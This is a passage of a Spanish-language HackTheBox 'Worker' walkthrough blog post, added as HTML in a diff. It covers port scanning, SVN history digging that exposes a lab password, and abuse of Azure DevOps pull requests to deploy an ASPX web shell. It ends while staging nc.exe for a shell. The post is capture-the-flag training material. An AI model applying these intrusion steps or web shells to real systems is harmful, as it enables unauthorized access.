@@ -1,0 +1,1160 @@
+<!DOCTYPE html>
+<html lang="en"><head>
+  <meta charset="utf-8">
+  <meta http-equiv="X-UA-Compatible" content="IE=edge">
+  <meta name="viewport" content="width=device-width, initial-scale=1"><!-- Begin Jekyll SEO tag v2.8.0 -->
+<title>HackTheBox - Worker (medium) | MiguelRega7 - blog</title>
+<meta name="generator" content="Jekyll v4.3.2" />
+<meta property="og:title" content="HackTheBox - Worker (medium)" />
+<meta name="author" content="MiguelRega7" />
+<meta property="og:locale" content="en_US" />
+<meta name="description" content="Posts sobre resolución de CTFs y ciberseguridad." />
+<meta property="og:description" content="Posts sobre resolución de CTFs y ciberseguridad." />
+<link rel="canonical" href="http://localhost:4000/hackthebox/machines/medium/2024/05/17/worker.html" />
+<meta property="og:url" content="http://localhost:4000/hackthebox/machines/medium/2024/05/17/worker.html" />
+<meta property="og:site_name" content="MiguelRega7 - blog" />
+<meta property="og:type" content="article" />
+<meta property="article:published_time" content="2024-05-17T00:00:00-06:00" />
+<meta name="twitter:card" content="summary" />
+<meta property="twitter:title" content="HackTheBox - Worker (medium)" />
+<script type="application/ld+json">
+{"@context":"https://schema.org","@type":"BlogPosting","author":{"@type":"Person","name":"MiguelRega7"},"dateModified":"2024-05-17T00:00:00-06:00","datePublished":"2024-05-17T00:00:00-06:00","description":"Posts sobre resolución de CTFs y ciberseguridad.","headline":"HackTheBox - Worker (medium)","mainEntityOfPage":{"@type":"WebPage","@id":"http://localhost:4000/hackthebox/machines/medium/2024/05/17/worker.html"},"url":"http://localhost:4000/hackthebox/machines/medium/2024/05/17/worker.html"}</script>
+<!-- End Jekyll SEO tag -->
+<link rel="stylesheet" href="/assets/css/style.css"><link type="application/atom+xml" rel="alternate" href="http://localhost:4000/feed.xml" title="MiguelRega7 - blog" />
+</head>
+<body><header class="site-header">
+
+  <div class="wrapper"><a class="site-title" rel="author" href="/">MiguelRega7 - blog</a><nav class="site-nav">
+        <input type="checkbox" id="nav-trigger" class="nav-trigger" />
+        <label for="nav-trigger">
+          <span class="menu-icon">
+            <svg viewBox="0 0 18 15" width="18px" height="15px">
+              <path d="M18,1.484c0,0.82-0.665,1.484-1.484,1.484H1.484C0.665,2.969,0,2.304,0,1.484l0,0C0,0.665,0.665,0,1.484,0 h15.032C17.335,0,18,0.665,18,1.484L18,1.484z M18,7.516C18,8.335,17.335,9,16.516,9H1.484C0.665,9,0,8.335,0,7.516l0,0 c0-0.82,0.665-1.484,1.484-1.484h15.032C17.335,6.031,18,6.696,18,7.516L18,7.516z M18,13.516C18,14.335,17.335,15,16.516,15H1.484 C0.665,15,0,14.335,0,13.516l0,0c0-0.82,0.665-1.483,1.484-1.483h15.032C17.335,12.031,18,12.695,18,13.516L18,13.516z"/>
+            </svg>
+          </span>
+        </label>
+
+        <div class="trigger"><a class="page-link" href="/about/">About</a></div>
+      </nav></div>
+</header>
+<main class="page-content" aria-label="Content">
+      <div class="wrapper">
+        <article class="post h-entry" itemscope itemtype="http://schema.org/BlogPosting">
+
+  <header class="post-header">
+    <h1 class="post-title p-name" itemprop="name headline">HackTheBox - Worker (medium)</h1>
+    <p class="post-meta"><time class="dt-published" datetime="2024-05-17T00:00:00-06:00" itemprop="datePublished">
+        May 17, 2024
+      </time></p>
+  </header>
+
+  <div class="post-content e-content" itemprop="articleBody">
+    <p align="center">
+<img src="https://labs.hackthebox.com/storage/avatars/13358d0b09074485f107f36625b50a5c.png" />
+</p>
+
+<ul>
+  <li>Worker is a medium box that teaches about software development environments and Azure DevOps pipeline abuse. It starts with extraction of source code from a SVN server, and then moves to a local Azure DevOps installation, which can be abused to gain a foothold and escalate privileges.</li>
+</ul>
+
+<h2 id="portscan">PortScan</h2>
+
+<ul>
+  <li>Comenzamos escaneando los puertos abiertos por el protocolo <strong>TCP</strong>.</li>
+</ul>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>➜  nmap <span class="nb">sudo </span>nmap <span class="nt">-sCV</span> <span class="nt">-p80</span>,3690,5985 10.10.10.203 <span class="nt">-oN</span> targeted
+Starting Nmap 7.94SVN <span class="o">(</span> https://nmap.org <span class="o">)</span> at 2024-05-14 18:47 CST
+Nmap scan report <span class="k">for </span>10.10.10.203
+Host is up <span class="o">(</span>0.087s latency<span class="o">)</span><span class="nb">.</span>
+
+PORT     STATE SERVICE  VERSION
+80/tcp   open  http     Microsoft IIS httpd 10.0
+| http-methods:
+|_  Potentially risky methods: TRACE
+|_http-server-header: Microsoft-IIS/10.0
+|_http-title: IIS Windows Server
+3690/tcp open  svnserve Subversion
+5985/tcp open  http     Microsoft HTTPAPI httpd 2.0 <span class="o">(</span>SSDP/UPnP<span class="o">)</span>
+|_http-title: Not Found
+|_http-server-header: Microsoft-HTTPAPI/2.0
+Service Info: OS: Windows<span class="p">;</span> CPE: cpe:/o:microsoft:windows
+</code></pre></div></div>
+
+<h2 id="enumeración">Enumeración</h2>
+
+<ul>
+  <li>Comenzamos enumerando el puerto 80.</li>
+</ul>
+
+<div class="language-ruby highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="err">➜</span>  <span class="n">nmap</span> <span class="n">whatweb</span> <span class="n">http</span><span class="ss">:/</span><span class="o">/</span><span class="mf">10.10</span><span class="o">.</span><span class="mf">10.203</span>
+<span class="n">http</span><span class="ss">:/</span><span class="o">/</span><span class="mf">10.10</span><span class="o">.</span><span class="mf">10.203</span> <span class="p">[</span><span class="mi">200</span> <span class="no">OK</span><span class="p">]</span> <span class="no">Country</span><span class="p">[</span><span class="no">RESERVED</span><span class="p">][</span><span class="no">ZZ</span><span class="p">],</span> <span class="no">HTTPServer</span><span class="p">[</span><span class="no">Microsoft</span><span class="o">-</span><span class="no">IIS</span><span class="o">/</span><span class="mf">10.0</span><span class="p">],</span> <span class="no">IP</span><span class="p">[</span><span class="mf">10.10</span><span class="o">.</span><span class="mf">10.203</span><span class="p">],</span> <span class="no">Microsoft</span><span class="o">-</span><span class="no">IIS</span><span class="p">[</span><span class="mf">10.0</span><span class="p">],</span> <span class="no">Title</span><span class="p">[</span><span class="no">IIS</span> <span class="no">Windows</span> <span class="no">Server</span><span class="p">],</span> <span class="no">X</span><span class="o">-</span><span class="no">Powered</span><span class="o">-</span><span class="no">By</span><span class="p">[</span><span class="no">ASP</span><span class="o">.</span><span class="no">NET</span><span class="p">]</span>
+</code></pre></div></div>
+
+<p align="center">
+<img src="/assets/hackthebox/img/machines/medium/worker/1.png" />
+</p>
+
+<ul>
+  <li>Vamos a hacer <code class="language-plaintext highlighter-rouge">fuzzing</code> para ver si encontramos alguna ruta interesante.</li>
+</ul>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>➜  nmap gobuster <span class="nb">dir</span> <span class="nt">-u</span> http://10.10.10.203 <span class="nt">-w</span> /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt <span class="nt">-t</span> 80 <span class="nt">--no-error</span>
+<span class="o">===============================================================</span>
+Gobuster v3.6
+by OJ Reeves <span class="o">(</span>@TheColonial<span class="o">)</span> &amp; Christian Mehlmauer <span class="o">(</span>@firefart<span class="o">)</span>
+<span class="o">===============================================================</span>
+<span class="o">[</span>+] Url:                     http://10.10.10.203
+<span class="o">[</span>+] Method:                  GET
+<span class="o">[</span>+] Threads:                 80
+<span class="o">[</span>+] Wordlist:                /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt
+<span class="o">[</span>+] Negative Status codes:   404
+<span class="o">[</span>+] User Agent:              gobuster/3.6
+<span class="o">[</span>+] Timeout:                 10s
+<span class="o">===============================================================</span>
+Starting gobuster <span class="k">in </span>directory enumeration mode
+<span class="o">===============================================================</span>
+/<span class="k">*</span>checkout<span class="k">*</span>           <span class="o">(</span>Status: 400<span class="o">)</span> <span class="o">[</span>Size: 3420]
+/<span class="k">*</span>docroot<span class="k">*</span>            <span class="o">(</span>Status: 400<span class="o">)</span> <span class="o">[</span>Size: 3420]
+/<span class="k">*</span>                    <span class="o">(</span>Status: 400<span class="o">)</span> <span class="o">[</span>Size: 3420]
+/http%3A%2F%2Fwww     <span class="o">(</span>Status: 400<span class="o">)</span> <span class="o">[</span>Size: 3420]
+/http%3A              <span class="o">(</span>Status: 400<span class="o">)</span> <span class="o">[</span>Size: 3420]
+/q%26a                <span class="o">(</span>Status: 400<span class="o">)</span> <span class="o">[</span>Size: 3420]
+/<span class="k">**</span>http%3a            <span class="o">(</span>Status: 400<span class="o">)</span> <span class="o">[</span>Size: 3420]
+/<span class="k">*</span>http%3A             <span class="o">(</span>Status: 400<span class="o">)</span> <span class="o">[</span>Size: 3420]
+/<span class="k">**</span>http%3A            <span class="o">(</span>Status: 400<span class="o">)</span> <span class="o">[</span>Size: 3420]
+/http%3A%2F%2Fyoutube <span class="o">(</span>Status: 400<span class="o">)</span> <span class="o">[</span>Size: 3420]
+/http%3A%2F%2Fblogs   <span class="o">(</span>Status: 400<span class="o">)</span> <span class="o">[</span>Size: 3420]
+/http%3A%2F%2Fblog    <span class="o">(</span>Status: 400<span class="o">)</span> <span class="o">[</span>Size: 3420]
+/<span class="k">**</span>http%3A%2F%2Fwww   <span class="o">(</span>Status: 400<span class="o">)</span> <span class="o">[</span>Size: 3420]
+/s%26p                <span class="o">(</span>Status: 400<span class="o">)</span> <span class="o">[</span>Size: 3420]
+/%3FRID%3D2671        <span class="o">(</span>Status: 400<span class="o">)</span> <span class="o">[</span>Size: 3420]
+/devinmoore<span class="k">*</span>          <span class="o">(</span>Status: 400<span class="o">)</span> <span class="o">[</span>Size: 3420]
+/200109<span class="k">*</span>              <span class="o">(</span>Status: 400<span class="o">)</span> <span class="o">[</span>Size: 3420]
+/<span class="k">*</span>dc_                 <span class="o">(</span>Status: 400<span class="o">)</span> <span class="o">[</span>Size: 3420]
+/<span class="k">*</span>sa_                 <span class="o">(</span>Status: 400<span class="o">)</span> <span class="o">[</span>Size: 3420]
+</code></pre></div></div>
+
+<ul>
+  <li>
+    <p>Bueno tenemos otro puerto abierto el cual es el 3690 que corre el servicio de <code class="language-plaintext highlighter-rouge">svnserve</code> <a href="https://book.hacktricks.xyz/network-services-pentesting/3690-pentesting-subversion-svn-server">https://book.hacktricks.xyz/network-services-pentesting/3690-pentesting-subversion-svn-server</a>.</p>
+  </li>
+  <li>
+    <p><a href="https://www.visualsvn.com/server/">https://www.visualsvn.com/server/</a>.</p>
+  </li>
+  <li>
+    <p>En <code class="language-plaintext highlighter-rouge">hacktricks</code> nos dicen como podemos enumerar este servicio.</p>
+  </li>
+</ul>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>➜  nmap nc <span class="nt">-vn</span> 10.10.10.203 3690
+<span class="o">(</span>UNKNOWN<span class="o">)</span> <span class="o">[</span>10.10.10.203] 3690 <span class="o">(</span>svn<span class="o">)</span> open
+<span class="o">(</span> success <span class="o">(</span> 2 2 <span class="o">(</span> <span class="o">)</span> <span class="o">(</span> edit-pipeline svndiff1 accepts-svndiff2 absent-entries commit-revprops depth log-revprops atomic-revprops partial-replay inherited-props ephemeral-txnprops file-revs-reverse list <span class="o">)</span> <span class="o">)</span> <span class="o">)</span>
+</code></pre></div></div>
+
+<ul>
+  <li>Además nos mencionan uso de esta herramienta.</li>
+</ul>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>➜  nmap svn <span class="nb">help
+</span>usage: svn &lt;subcommand&gt; <span class="o">[</span>options] <span class="o">[</span>args]
+Subversion command-line client.
+Type <span class="s1">'svn help &lt;subcommand&gt;'</span> <span class="k">for </span><span class="nb">help </span>on a specific subcommand.
+Type <span class="s1">'svn --version'</span> to see the program version and RA modules,
+     <span class="s1">'svn --version --verbose'</span> to see dependency versions as well,
+     <span class="s1">'svn --version --quiet'</span> to see just the version number.
+
+Most subcommands take file and/or directory arguments, recursing
+on the directories.  If no arguments are supplied to such a
+<span class="nb">command</span>, it recurses on the current directory <span class="o">(</span>inclusive<span class="o">)</span> by default.
+
+Available subcommands:
+   add
+   auth
+   blame <span class="o">(</span>praise, annotate, ann<span class="o">)</span>
+   <span class="nb">cat
+   </span>changelist <span class="o">(</span>cl<span class="o">)</span>
+   checkout <span class="o">(</span>co<span class="o">)</span>
+   cleanup
+   commit <span class="o">(</span>ci<span class="o">)</span>
+   copy <span class="o">(</span><span class="nb">cp</span><span class="o">)</span>
+   delete <span class="o">(</span>del, remove, <span class="nb">rm</span><span class="o">)</span>
+   diff <span class="o">(</span>di<span class="o">)</span>
+   <span class="nb">export
+   help</span> <span class="o">(</span>?, h<span class="o">)</span>
+   import
+   info
+   list <span class="o">(</span><span class="nb">ls</span><span class="o">)</span>
+   lock
+   log
+   merge
+   mergeinfo
+   <span class="nb">mkdir
+   </span>move <span class="o">(</span><span class="nb">mv</span>, rename, ren<span class="o">)</span>
+   patch
+   propdel <span class="o">(</span>pdel, pd<span class="o">)</span>
+   propedit <span class="o">(</span>pedit, pe<span class="o">)</span>
+   propget <span class="o">(</span>pget, pg<span class="o">)</span>
+   proplist <span class="o">(</span>plist, pl<span class="o">)</span>
+   propset <span class="o">(</span>pset, ps<span class="o">)</span>
+   relocate
+   resolve
+   resolved
+   revert
+   status <span class="o">(</span><span class="nb">stat</span>, st<span class="o">)</span>
+   switch <span class="o">(</span>sw<span class="o">)</span>
+   unlock
+   update <span class="o">(</span>up<span class="o">)</span>
+   upgrade
+
+Subversion is a tool <span class="k">for </span>version control.
+For additional information, see http://subversion.apache.org/
+</code></pre></div></div>
+
+<ul>
+  <li>Podemos listar lo que hay.</li>
+</ul>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>➜  nmap svn <span class="nb">ls </span>svn://10.10.10.203
+dimension.worker.htb/
+moved.txt
+</code></pre></div></div>
+
+<ul>
+  <li>Tambien nos dicen que podemos descargar el repositorio.</li>
+</ul>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>➜  nmap svn checkout svn://10.10.10.203
+A    dimension.worker.htb
+A    dimension.worker.htb/LICENSE.txt
+A    dimension.worker.htb/README.txt
+A    dimension.worker.htb/assets
+A    dimension.worker.htb/assets/css
+A    dimension.worker.htb/assets/css/fontawesome-all.min.css
+A    dimension.worker.htb/assets/css/main.css
+A    dimension.worker.htb/assets/css/noscript.css
+A    dimension.worker.htb/assets/js
+A    dimension.worker.htb/assets/js/breakpoints.min.js
+A    dimension.worker.htb/assets/js/browser.min.js
+A    dimension.worker.htb/assets/js/jquery.min.js
+A    dimension.worker.htb/assets/js/main.js
+A    dimension.worker.htb/assets/js/util.js
+A    dimension.worker.htb/assets/sass
+A    dimension.worker.htb/assets/sass/base
+A    dimension.worker.htb/assets/sass/base/_page.scss
+A    dimension.worker.htb/assets/sass/base/_reset.scss
+A    dimension.worker.htb/assets/sass/base/_typography.scss
+A    dimension.worker.htb/assets/sass/components
+A    dimension.worker.htb/assets/sass/components/_actions.scss
+A    dimension.worker.htb/assets/sass/components/_box.scss
+A    dimension.worker.htb/assets/sass/components/_button.scss
+A    dimension.worker.htb/assets/sass/components/_form.scss
+A    dimension.worker.htb/assets/sass/components/_icon.scss
+A    dimension.worker.htb/assets/sass/components/_icons.scss
+A    dimension.worker.htb/assets/sass/components/_image.scss
+A    dimension.worker.htb/assets/sass/components/_list.scss
+A    dimension.worker.htb/assets/sass/components/_table.scss
+A    dimension.worker.htb/assets/sass/layout
+A    dimension.worker.htb/assets/sass/layout/_bg.scss
+A    dimension.worker.htb/assets/sass/layout/_footer.scss
+A    dimension.worker.htb/assets/sass/layout/_header.scss
+A    dimension.worker.htb/assets/sass/layout/_main.scss
+A    dimension.worker.htb/assets/sass/layout/_wrapper.scss
+A    dimension.worker.htb/assets/sass/libs
+A    dimension.worker.htb/assets/sass/libs/_breakpoints.scss
+A    dimension.worker.htb/assets/sass/libs/_functions.scss
+A    dimension.worker.htb/assets/sass/libs/_mixins.scss
+A    dimension.worker.htb/assets/sass/libs/_vars.scss
+A    dimension.worker.htb/assets/sass/libs/_vendor.scss
+A    dimension.worker.htb/assets/sass/main.scss
+A    dimension.worker.htb/assets/sass/noscript.scss
+A    dimension.worker.htb/assets/webfonts
+A    dimension.worker.htb/assets/webfonts/fa-brands-400.eot
+A    dimension.worker.htb/assets/webfonts/fa-brands-400.svg
+A    dimension.worker.htb/assets/webfonts/fa-brands-400.ttf
+A    dimension.worker.htb/assets/webfonts/fa-brands-400.woff
+A    dimension.worker.htb/assets/webfonts/fa-brands-400.woff2
+A    dimension.worker.htb/assets/webfonts/fa-regular-400.eot
+A    dimension.worker.htb/assets/webfonts/fa-regular-400.svg
+A    dimension.worker.htb/assets/webfonts/fa-regular-400.ttf
+A    dimension.worker.htb/assets/webfonts/fa-regular-400.woff
+A    dimension.worker.htb/assets/webfonts/fa-regular-400.woff2
+A    dimension.worker.htb/assets/webfonts/fa-solid-900.eot
+A    dimension.worker.htb/assets/webfonts/fa-solid-900.svg
+A    dimension.worker.htb/assets/webfonts/fa-solid-900.ttf
+A    dimension.worker.htb/assets/webfonts/fa-solid-900.woff
+A    dimension.worker.htb/assets/webfonts/fa-solid-900.woff2
+A    dimension.worker.htb/images
+A    dimension.worker.htb/images/bg.jpg
+A    dimension.worker.htb/images/overlay.png
+A    dimension.worker.htb/images/pic01.jpg
+A    dimension.worker.htb/images/pic02.jpg
+A    dimension.worker.htb/images/pic03.jpg
+A    dimension.worker.htb/index.html
+A    moved.txt
+Checked out revision 5.
+</code></pre></div></div>
+
+<ul>
+  <li>Si vemos lo que dice <code class="language-plaintext highlighter-rouge">moved.txt</code> nos dan un subdominio nos hablan sobre una versión final.</li>
+</ul>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>➜  nmap <span class="nb">cat </span>moved.txt
+This repository has been migrated and will no longer be maintaned here.
+You can find the latest version at: http://devops.worker.htb
+
+// The Worker team :<span class="o">)</span>
+</code></pre></div></div>
+
+<ul>
+  <li>Vamos agregarlos al <code class="language-plaintext highlighter-rouge">/etc/hosts</code> para que en caso de que sea alguna pagina web nos pueda resolver.</li>
+</ul>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>➜  nmap <span class="nb">echo</span> <span class="s2">"10.10.10.203 devops.worker.htb dimension.worker.htb"</span> | <span class="nb">sudo tee</span> <span class="nt">-a</span> /etc/hosts
+</code></pre></div></div>
+
+<ul>
+  <li>Nos pide credenciales.</li>
+</ul>
+
+<p align="center">
+<img src="/assets/hackthebox/img/machines/medium/worker/2.png" />
+</p>
+
+<p align="center">
+<img src="/assets/hackthebox/img/machines/medium/worker/3.png" />
+</p>
+
+<ul>
+  <li>En el otro subdominio solo encontramos esto.</li>
+</ul>
+
+<p align="center">
+<img src="/assets/hackthebox/img/machines/medium/worker/4.png" />
+</p>
+
+<ul>
+  <li>Esto es todo lo que contiene.</li>
+</ul>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>➜  dimension.worker.htb tree
+<span class="nb">.</span>
+├── LICENSE.txt
+├── README.txt
+├── assets
+│   ├── css
+│   │   ├── fontawesome-all.min.css
+│   │   ├── main.css
+│   │   └── noscript.css
+│   ├── js
+│   │   ├── breakpoints.min.js
+│   │   ├── browser.min.js
+│   │   ├── jquery.min.js
+│   │   ├── main.js
+│   │   └── util.js
+│   ├── sass
+│   │   ├── base
+│   │   │   ├── _page.scss
+│   │   │   ├── _reset.scss
+│   │   │   └── _typography.scss
+│   │   ├── components
+│   │   │   ├── _actions.scss
+│   │   │   ├── _box.scss
+│   │   │   ├── _button.scss
+│   │   │   ├── _form.scss
+│   │   │   ├── _icon.scss
+│   │   │   ├── _icons.scss
+│   │   │   ├── _image.scss
+│   │   │   ├── _list.scss
+│   │   │   └── _table.scss
+│   │   ├── layout
+│   │   │   ├── _bg.scss
+│   │   │   ├── _footer.scss
+│   │   │   ├── _header.scss
+│   │   │   ├── _main.scss
+│   │   │   └── _wrapper.scss
+│   │   ├── libs
+│   │   │   ├── _breakpoints.scss
+│   │   │   ├── _functions.scss
+│   │   │   ├── _mixins.scss
+│   │   │   ├── _vars.scss
+│   │   │   └── _vendor.scss
+│   │   ├── main.scss
+│   │   └── noscript.scss
+│   └── webfonts
+│       ├── fa-brands-400.eot
+│       ├── fa-brands-400.svg
+│       ├── fa-brands-400.ttf
+│       ├── fa-brands-400.woff
+│       ├── fa-brands-400.woff2
+│       ├── fa-regular-400.eot
+│       ├── fa-regular-400.svg
+│       ├── fa-regular-400.ttf
+│       ├── fa-regular-400.woff
+│       ├── fa-regular-400.woff2
+│       ├── fa-solid-900.eot
+│       ├── fa-solid-900.svg
+│       ├── fa-solid-900.ttf
+│       ├── fa-solid-900.woff
+│       └── fa-solid-900.woff2
+├── images
+│   ├── bg.jpg
+│   ├── overlay.png
+│   ├── pic01.jpg
+│   ├── pic02.jpg
+│   └── pic03.jpg
+└── index.html
+
+11 directories, 55 files
+</code></pre></div></div>
+
+<ul>
+  <li>Aquí podemos ver el <code class="language-plaintext highlighter-rouge">Commit history</code>.</li>
+</ul>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>➜  dimension.worker.htb svn log svn://10.10.10.203
+<span class="nt">------------------------------------------------------------------------</span>
+r5 | nathen | 2020-06-20 08:52:00 <span class="nt">-0500</span> <span class="o">(</span>Sat, 20 Jun 2020<span class="o">)</span> | 1 line
+
+Added note that repo has been migrated
+<span class="nt">------------------------------------------------------------------------</span>
+r4 | nathen | 2020-06-20 08:50:20 <span class="nt">-0500</span> <span class="o">(</span>Sat, 20 Jun 2020<span class="o">)</span> | 1 line
+
+Moving this repo to our new devops server which will handle the deployment <span class="k">for </span>us
+<span class="nt">------------------------------------------------------------------------</span>
+r3 | nathen | 2020-06-20 08:46:19 <span class="nt">-0500</span> <span class="o">(</span>Sat, 20 Jun 2020<span class="o">)</span> | 1 line
+
+-
+<span class="nt">------------------------------------------------------------------------</span>
+r2 | nathen | 2020-06-20 08:45:16 <span class="nt">-0500</span> <span class="o">(</span>Sat, 20 Jun 2020<span class="o">)</span> | 1 line
+
+Added deployment script
+<span class="nt">------------------------------------------------------------------------</span>
+r1 | nathen | 2020-06-20 08:43:43 <span class="nt">-0500</span> <span class="o">(</span>Sat, 20 Jun 2020<span class="o">)</span> | 1 line
+
+First version
+<span class="nt">------------------------------------------------------------------------</span>
+</code></pre></div></div>
+
+<ul>
+  <li>Este es interesante.</li>
+</ul>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>➜  dimension.worker.htb svn log <span class="nt">-r</span> 4 svn://10.10.10.203
+<span class="nt">------------------------------------------------------------------------</span>
+r4 | nathen | 2020-06-20 08:50:20 <span class="nt">-0500</span> <span class="o">(</span>Sat, 20 Jun 2020<span class="o">)</span> | 1 line
+
+Moving this repo to our new devops server which will handle the deployment <span class="k">for </span>us
+<span class="nt">------------------------------------------------------------------------</span>
+</code></pre></div></div>
+
+<ul>
+  <li>El archivo <code class="language-plaintext highlighter-rouge">deploy.ps1</code> fue eliminado.</li>
+</ul>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>➜  dimension.worker.htb svn log <span class="nt">-v</span> <span class="nt">-r</span> 4 svn://10.10.10.203
+<span class="nt">------------------------------------------------------------------------</span>
+r4 | nathen | 2020-06-20 08:50:20 <span class="nt">-0500</span> <span class="o">(</span>Sat, 20 Jun 2020<span class="o">)</span> | 1 line
+Changed paths:
+   D /deploy.ps1
+
+Moving this repo to our new devops server which will handle the deployment <span class="k">for </span>us
+<span class="nt">------------------------------------------------------------------------</span>
+</code></pre></div></div>
+
+<ul>
+  <li>Si revisamos cambios que se realizaron en ese archivo antes de ser eliminado vemos credenciales.</li>
+</ul>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>➜  dimension.worker.htb svn diff <span class="nt">-r</span> 2:3 svn://10.10.10.203/deploy.ps1
+
+Index: deploy.ps1
+<span class="o">===================================================================</span>
+<span class="nt">---</span> deploy.ps1	<span class="o">(</span>revision 2<span class="o">)</span>
++++ deploy.ps1	<span class="o">(</span>revision 3<span class="o">)</span>
+@@ <span class="nt">-1</span>,6 +1,7 @@
+ <span class="nv">$user</span> <span class="o">=</span> <span class="s2">"nathen"</span>
+-<span class="nv">$plain</span> <span class="o">=</span> <span class="s2">"wendel98"</span>
++# NOTE: We cant have my password here!!!
++<span class="nv">$plain</span> <span class="o">=</span> <span class="s2">""</span>
+ <span class="nv">$pwd</span> <span class="o">=</span> <span class="o">(</span><span class="nv">$plain</span> | ConvertTo-SecureString<span class="o">)</span>
+ <span class="nv">$Credential</span> <span class="o">=</span> New-Object System.Management.Automation.PSCredential <span class="nv">$user</span>, <span class="nv">$pwd</span>
+ <span class="nv">$args</span> <span class="o">=</span> <span class="s2">"Copy-Site.ps1"</span>
+<span class="nt">-Start-Process</span> powershell.exe <span class="nt">-Credential</span> <span class="nv">$Credential</span> <span class="nt">-ArgumentList</span> <span class="o">(</span><span class="s2">"-file </span><span class="nv">$args</span><span class="s2">"</span><span class="o">)</span>
++Start-Process powershell.exe <span class="nt">-Credential</span> <span class="nv">$Credential</span> <span class="nt">-ArgumentList</span> <span class="o">(</span><span class="s2">"-file </span><span class="nv">$args</span><span class="s2">"</span><span class="o">)</span>
+<span class="se">\ </span>No newline at end of file
+</code></pre></div></div>
+
+<ul>
+  <li>Si las probamos en el sitio web vemos que son correctas.</li>
+</ul>
+
+<p align="center">
+<img src="/assets/hackthebox/img/machines/medium/worker/5.png" />
+</p>
+
+<h2 id="shell-as-defaultapppool">Shell as defaultapppool</h2>
+
+<ul>
+  <li>Vemos varios repositorios al parecer son los subdominios.</li>
+</ul>
+
+<p align="center">
+<img src="/assets/hackthebox/img/machines/medium/worker/6.png" />
+</p>
+
+<ul>
+  <li>
+    <p>Como tenemos acceso podemos subir un <code class="language-plaintext highlighter-rouge">.aspx</code> para ganar acceso <a href="https://raw.githubusercontent.com/tennc/webshell/master/fuzzdb-webshell/asp/cmdasp.aspx">https://raw.githubusercontent.com/tennc/webshell/master/fuzzdb-webshell/asp/cmdasp.aspx</a>.</p>
+  </li>
+  <li>
+    <p>Si lo intentamos subir no nos deja.</p>
+  </li>
+</ul>
+
+<p align="center">
+<img src="/assets/hackthebox/img/machines/medium/worker/7.png" />
+</p>
+
+<ul>
+  <li>
+    <p>Nos dicen que tenemos que hacer un <code class="language-plaintext highlighter-rouge">Pull Request</code>.</p>
+  </li>
+  <li>
+    <p>Vamos a crear una nueva rama.</p>
+  </li>
+</ul>
+
+<p align="center">
+<img src="/assets/hackthebox/img/machines/medium/worker/8.png" />
+</p>
+
+<ul>
+  <li>Si subimos el archivo vemos que ahora si se puede.</li>
+</ul>
+
+<p align="center">
+<img src="/assets/hackthebox/img/machines/medium/worker/9.png" />
+</p>
+
+<ul>
+  <li>Vamos a crear un <code class="language-plaintext highlighter-rouge">Pull Request</code>.</li>
+</ul>
+
+<p align="center">
+<img src="/assets/hackthebox/img/machines/medium/worker/10.png" />
+</p>
+
+<p align="center">
+<img src="/assets/hackthebox/img/machines/medium/worker/11.png" />
+</p>
+
+<ul>
+  <li>Ahora lo aprobamos.</li>
+</ul>
+
+<p align="center">
+<img src="/assets/hackthebox/img/machines/medium/worker/12.png" />
+</p>
+
+<p align="center">
+<img src="/assets/hackthebox/img/machines/medium/worker/13.png" />
+</p>
+
+<ul>
+  <li>Pero no vemos nada.</li>
+</ul>
+
+<p align="center">
+<img src="/assets/hackthebox/img/machines/medium/worker/14.png" />
+</p>
+
+<ul>
+  <li>
+    <p>Podemos aprovecharnos de los Pipeline <a href="https://learn.microsoft.com/es-es/azure/azure-resource-manager/templates/deployment-tutorial-pipeline">https://learn.microsoft.com/es-es/azure/azure-resource-manager/templates/deployment-tutorial-pipeline</a>.</p>
+  </li>
+  <li>
+    <p>Si le damos en Run vemos que podemos construir una.</p>
+  </li>
+</ul>
+
+<p align="center">
+<img src="/assets/hackthebox/img/machines/medium/worker/15.png" />
+</p>
+
+<ul>
+  <li>
+    <p>Bueno nos da un error y esto es por que al parecer la otra rama fue eliminada yo creo entonces tenemos que hacerlo rápido lo que vamos hacer es crear todo otra vez y subir el <code class="language-plaintext highlighter-rouge">cmd.aspx</code> hacer los mismos pasos pero ahora con la nueva rama.</p>
+  </li>
+  <li>
+    <p>Y vemos que ya se puede.</p>
+  </li>
+</ul>
+
+<p align="center">
+<img src="/assets/hackthebox/img/machines/medium/worker/16.png" />
+</p>
+
+<ul>
+  <li>Bueno ahora solo falta agregar el subdominio al <code class="language-plaintext highlighter-rouge">/etc/hosts</code>.</li>
+</ul>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>➜  content <span class="nb">cat</span> /etc/hosts | <span class="nb">tail</span> <span class="nt">-n1</span>
+10.10.10.203 devops.worker.htb dimension.worker.htb alpha.worker.htb
+</code></pre></div></div>
+
+<ul>
+  <li>Y listo.</li>
+</ul>
+
+<p align="center">
+<img src="/assets/hackthebox/img/machines/medium/worker/17.png" />
+</p>
+
+<ul>
+  <li>
+    <p>Ahora vamos a ganar acceso.</p>
+  </li>
+  <li>
+    <p>Vamos a usar el <code class="language-plaintext highlighter-rouge">netcat</code>.</p>
+  </li>
+</ul>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>➜  content <span class="nb">cp</span> /usr/share/seclists/Web-Shells/FuzzDB/nc.exe <span class="nb">.</span>
+➜  content python3 <span class="nt">-m</span> http.server 8080
+Serving HTTP on 0.0.0.0 port 8080 <span class="o">(</span>http://0.0.0.0:8080/<span class="o">)</span> ...
+</code></pre></div></div>
+
+<ul>
